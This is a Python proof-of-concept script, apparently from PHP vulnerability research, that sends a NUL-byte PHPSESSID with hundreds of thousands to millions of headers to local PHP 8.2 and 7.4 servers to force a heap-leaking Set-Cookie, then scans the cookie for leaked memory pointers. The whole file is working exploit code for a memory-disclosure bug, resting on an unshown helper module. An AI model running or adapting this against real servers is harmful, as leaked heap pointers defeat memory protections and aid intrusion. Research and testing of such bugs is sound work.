#!/usr/bin/env python3
"""Test the dinosn NUL-byte (PHPSESSID=\x00) leak arm on sub-8.3 versions.
The REPORT already tested SID 19/26/32B (no leak on 8.2.34). This tests the
NUL-byte sid specifically, which dinosn says OOMs inside php_session_send_cookie
and forces send_cookie=1 -> a heap-leaking Set-Cookie."""
import sys, os, time, struct, collections
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php72"))
import drive as D

def analyze_cookie(sc):
    """Return (decoded_len, heap_ptr_hits, sample)."""
    if not sc:
        return 0, 0, ""
    # Set-Cookie: PHPSESSID=<urlencoded>; path=/
    val = sc
    if "=" in val:
        val = val.split("=", 1)[1]
    val = val.split(";")[0]
    import urllib.parse
    data = urllib.parse.unquote_to_bytes(val)
    hits = 0
    for off in range(0, len(data) - 8, 8):
        q = struct.unpack_from("<Q", data, off)[0]
        if 0x7F0000000000 <= q < 0x800000000000:
            hits += 1
    return len(data), hits, data[:40]

def try_arm(port, nheaders, sid=b"\x00"):
    try:
        c = D.Conn("127.0.0.1", port, False, timeout=120)
    except Exception as e:
        return "conn-fail %r" % (e,)
    try:
        body = D.arm_body(nheaders, b"a:\n", sid)
        t0 = time.time()
        r = c.post("/index.php", body, False, maxread=65536)
        sc = r["headers"].get("set-cookie", "")
        dl, hits, _ = analyze_cookie(sc)
        return {"status": r["status"], "wire": len(body), "ttfb": r["ttfb"],
                "cookie_raw": len(sc), "decoded": dl, "heap_hits": hits}
    except Exception as e:
        return "post-fail %r" % (e,)
    finally:
        c.close()

TARGETS = [("8.2.34", 18111), ("7.4.33", 18108)]
NHEADS = [200000, 600000, 1299780, 2400000]

for ver, port in TARGETS:
    print("=== %s (port %d) ===" % (ver, port), flush=True)
    for nh in NHEADS:
        r = try_arm(port, nh)
        if isinstance(r, str):
            print("  nh=%-8d %s" % (nh, r), flush=True)
        else:
            leak = r["heap_hits"] >= 5
            print("  nh=%-8d status=%s wire=%-8d ttfb=%-7s raw_ck=%-7d dec=%-7d heap_hits=%-4d %s"
                  % (nh, r["status"], r["wire"], r["ttfb"], r["cookie_raw"],
                     r["decoded"], r["heap_hits"], "  <== LEAK!" if leak else ""), flush=True)
        time.sleep(0.5)
print("DONE")
